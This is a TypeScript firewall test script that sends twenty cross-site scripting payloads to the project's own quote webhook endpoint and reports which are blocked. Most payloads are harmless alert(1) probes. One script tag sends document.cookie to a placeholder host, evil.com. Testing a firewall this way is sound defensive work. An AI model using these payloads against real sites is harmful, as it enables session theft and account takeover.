import { finishWithExit, printFailures, printSummary, runBatches, logger, testUserAgents } from "../firewall/_helpers.ts";
import type { RequestSpec } from "../firewall/_helpers.ts";

const targetPath = "/api/webhook?action=quote";

async function main(): Promise<void> {
  const xssPayloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<a href=javascript:alert(1)>click</a>",
    "<link rel=import href=javascript:alert(1)>",
    "<base href=javascript:alert(1)//>",
    "<meta http-equiv=refresh content=0;javascript:alert(1)>",
    "<svg><animate onbegin=alert(1) attributeName=x></svg>",
    "-alert(1)-",
    "';alert(1);//",
    "\"><script>alert(1)</script>",
    "<script>fetch('http://evil.com?c='+document.cookie)</script>",
  ];

  const specs: RequestSpec[] = xssPayloads.map((payload, index) => ({
    id: index,
    label: `xss-${payload.substring(0, 15)}`,
    method: "GET",
    path: `${targetPath}&symbol=${encodeURIComponent("AAPL")}&period=${encodeURIComponent(payload)}`,
    userAgent: testUserAgents[index % testUserAgents.length],
    fakeIp: undefined,
  }));

  logger.step(`Testing ${specs.length} XSS payloads`);
  const results = await runBatches(specs, 4);
  printSummary("XSS Attacks", results);
  printFailures(results, 30);
  finishWithExit(results);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});